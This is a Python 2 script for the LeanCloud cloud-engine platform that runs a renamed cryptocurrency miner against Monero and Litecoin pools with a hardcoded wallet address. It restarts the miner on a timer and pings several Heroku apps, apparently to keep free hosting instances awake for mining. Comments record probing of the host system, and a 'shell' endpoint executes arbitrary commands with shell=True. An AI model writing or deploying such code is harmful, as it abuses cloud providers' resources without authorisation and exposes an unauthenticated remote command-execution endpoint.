# coding: utf-8
from leancloud import Engine
from leancloud import LeanEngineError

import subprocess
import select
import requests
import time
import os   # 在云引擎 Python 环境中使用自定义的环境变量,WORK_ID=1
import psutil

engine = Engine()

#{'cmd':' cat /proc/version '}
#Linux version 3.13.0-123-generic (buildd@lcy01-10) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #172-Ubuntu SMP Mon Jun 26 18:04:35 UTC 2017

#{'cmd':'grep "model name" /proc/cpuinfo'}
#model name : Common KVM CPU            #共7行
#model name	: Intel(R) Core(TM) i5 CPU         650  @ 3.20GHz

#{'cmd':'uname -a'}
#Linux 0ee7d925a033 3.13.0-123-generic #172-Ubuntu SMP Mon Jun 26 18:04:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
#Linux azhu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

#{'cmd':'cat /proc/meminfo |grep -i hugepages'}
#AnonHugePages:    192512 kB
#HugePages_Total:       0
#HugePages_Free:        0
#HugePages_Rsvd:        0
#HugePages_Surp:        0
#Hugepagesize:       2048 kB

#{'cmd':' cat /proc/cpuinfo '}
#cpu MHz : 2593.748
#flags : fpu de pse tsc msr pae mce cx8 apic mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl pni cx16 sse4_1 sse4_2 x2apic popcnt aes avx hypervisor lahf_lm
#{'cmd':' cat /proc/softirqs '}
#{'cmd':' cat /proc/stat '}

#{'cmd':' cat /proc/cmdline '}
#BOOT_IMAGE=/boot/vmlinuz-4.4.0-72-generic root=/dev/vda1 ro video=800x600 cgroup_enable=memory swapaccount=1 console=ttyS0,115200n8
#BOOT_IMAGE=/boot/vmlinuz-4.13.0-36-generic root=UUID=a60681aa-fed1-496a-a211-fc83a4ce3fe0 ro quiet splash vt.handoff=7

#{'cmd':' cat /proc/interrupts '}

#{'cmd':' cat /proc/modules '}

#{'cmd':'cd cpuminer-multi  && ./autogen.sh'}
#{'cmd':'file cpum'}
#cpum: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6886220435b0233c7e51d725fc29423f300c289a, not stripped





APP_ROOT = os.getcwd()
#STR_CMD_MINE = 'PATH="$PATH:' + APP_ROOT +'" && echo $PATH && '
STR_CMD_MINE = 'PATH="$PATH:/home/leanengine/app:/home/leanengine/app/lib" && echo $PATH && '

#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
ENGNIE_RESTARTED = True
SUBPROCESS_RUNNING = False      #MineShell中进程有消息，就设为True, 但定时置为False，以便查看进程是否运行
NUM_ENGINE_LOOP = 0             #EngineLoop运行次数，用于决定是否唤醒自身
NUM_SUBPROCESS_LOOP = 0         #SUBPROCESS_RUNNING = False时的运行次数，用于决定是否重启Mine
APP_DOMAIN = os.environ.get('LEANCLOUD_APP_DOMAIN')     #domain和WORK_ID统一为一个标识符

print 'APP_ROOT:',APP_ROOT
print 'APP_DOMAIN:',APP_DOMAIN
print 'Please set domain and loop timer:18 * 0-23 * * ?'

def MineShell( cmd, **params ):
	global SUBPROCESS_RUNNING
	print 'shell:', cmd
	result = subprocess.Popen(
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	n = 0
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] )  # select函数阻塞进程，直到select_rfds中的套接字被触发
		SUBPROCESS_RUNNING = True
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()  # 行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )  # result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg[29:],             #简化的console消息
		if (n % 32 == 0):
			print psutil.cpu_times_percent()
		n += 1

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )  # result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait()  # 等待字进程结束( 等待shell命令结束 )
	print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode


def Mine_cpuminer_LiteCoin():
	# cpum is rename from minerd,
	# minerd::Multi-algo CPUMiner & Reference Cryptonote Miner (JSON-RPC 2.0)
	# cpuminer-multi::https://github.com/lucasjones/cpuminer-multi
	print 'Mine_cpuminer_LiteCoin:Once'
	OutputShell('chmod +x cpum')
	time.sleep(1)
	#WORK_ID = os.environ.get( 'WORK_ID' )
	str_cmd = STR_CMD_MINE + 'cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'
	str_cmd += ' --userpass waylite.' + APP_DOMAIN + ':x'
	MineShell(str_cmd)
	
def Mine_cpuminer_Monero():
	# cpum is rename from minerd,
	# minerd::Multi-algo CPUMiner & Reference Cryptonote Miner (JSON-RPC 2.0)
	# cpuminer-multi::https://github.com/lucasjones/cpuminer-multi
	WALLET_ADDRESS ='496oNrFu5WAGHw6by228ofjExonQarbNWcWk1aC7QLMKdPpCa2ZBBD9QPqndnWQJ6pTmqFhtr4XZZGJPbK632HkS14qAbNK'
	print 'Mine_cpuminer_Monero:Once'
	OutputShell('chmod +x cpum')
	time.sleep(1)
	#WORK_ID = os.environ.get( 'WORK_ID' )
	str_cmd = STR_CMD_MINE + 'cpum --threads=1 --algo=cryptonight --url=stratum+tcp://pool.supportxmr.com:3333 --user=' + WALLET_ADDRESS + '+1000 --pass=worker'
	str_cmd += '.' + APP_DOMAIN
	MineShell(str_cmd)
	
def Mine_xmr_stak_Monero():
	# cpum is rename from minerd,
	# minerd::Multi-algo CPUMiner & Reference Cryptonote Miner (JSON-RPC 2.0)
	# cpuminer-multi::https://github.com/lucasjones/cpuminer-multi
	WALLET_ADDRESS ='496oNrFu5WAGHw6by228ofjExonQarbNWcWk1aC7QLMKdPpCa2ZBBD9QPqndnWQJ6pTmqFhtr4XZZGJPbK632HkS14qAbNK'
	print 'Mine_cpuminer_Monero:Once'
	OutputShell('chmod +x xmrstak')
	time.sleep(1)
	#WORK_ID = os.environ.get( 'WORK_ID' )
	str_cmd = STR_CMD_MINE + 'xmrstak'
	MineShell(str_cmd)

# 1m运行一次
# 只需要一个定时器，解决全部定时任务
@engine.define( 'engineloop' )
def EngineLoop(**params):
	global ENGNIE_RESTARTED
	global SUBPROCESS_RUNNING
	global NUM_ENGINE_LOOP
	global NUM_SUBPROCESS_LOOP

	if (NUM_ENGINE_LOOP % 30 == 29):  # 29Loop唤醒自身
		SUBPROCESS_RUNNING = False
		Heart()

	if (ENGNIE_RESTARTED):
		ENGNIE_RESTARTED = False
		Mine_cpuminer_Monero()
	else:
		# 检查进程过程中
		if (SUBPROCESS_RUNNING):
			NUM_SUBPROCESS_LOOP = 0
			print 'R',
		else:
			if (NUM_SUBPROCESS_LOOP < 7):
				print 'SUBPROCESS not in run',NUM_SUBPROCESS_LOOP
				NUM_SUBPROCESS_LOOP += 1
			else:
				NUM_SUBPROCESS_LOOP = 0     # 7Loop内无消息，认为进程结束了
				Mine_cpuminer_Monero()
	NUM_ENGINE_LOOP += 1
	return True

#上传运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'setup' )
def Setup(**params):
	OutputShell('chmod +x cpum')
	return True

@engine.define( 'install' )
def cmd_install(**params):
	OutputShell('apt-get install cpulimit')
	OutputShell('sudo apt-get install cpulimit')
	return True

@engine.define( 'ls' )
def ls_cmd(**params):
	OutputShell('ls -l')
	return True

@engine.define( 'sysinfo' )
def cmd_sysinfo(**params):
	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
	return True

#半小时运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'heart' )
def Heart(**params):
	url = "http://" + APP_DOMAIN + ".leanapp.cn/heart"
	response = requests.get( url )
	print url,'..Heart End'
	print 'Heart of herokuapp',
	response = requests.get( "https://my-m001.herokuapp.com/" )
	response = requests.get( "https://my-m002.herokuapp.com/" )
	response = requests.get( "https://my-m003.herokuapp.com/")
	print '..Heart End'
	return True

@engine.define( 'shell' )
# 调试 {'cmd':'ls -l' }
def OutputShell( cmd, **params ):
	global SUBPROCESS_RUNNING
	print 'shell:',cmd
	result = subprocess.Popen(
		#[ "ping 127.0.0.1" ],
		#[ "find /usr" ],
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
		SUBPROCESS_RUNNING = True
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()      #行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg,

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait() # 等待字进程结束( 等待shell命令结束 )
	print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode

@engine.define( 'cpuinfo' )
def cpu_info():
	try:
		print 'psutil.cpu_times_percent()', psutil.cpu_times_percent()
	except:
		pass
	return True


	print 'psutil.pids()',psutil.pids()
	print 'psutil.cpu_count()',psutil.cpu_count()

	try:
		print 'psutil.cpu_count(logical=False)', psutil.cpu_count(logical=False)
	except:
		pass
	try:
		print 'psutil.cpu_stats()', psutil.cpu_stats()
	except:
		pass
	try:
		print 'psutil.cpu_freq()', psutil.cpu_freq()
	except:
		pass
	try:
		print 'psutil.cpu_percent()', psutil.cpu_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times_percent()', psutil.cpu_times_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times()', psutil.cpu_times()
	except:
		pass
	try:
		print 'psutil.cpu_times(percpu=True)', psutil.cpu_times(percpu=True)
	except:
		pass
	try:
		print 'psutil.cpu_times().user', psutil.cpu_times().user
	except:
		pass
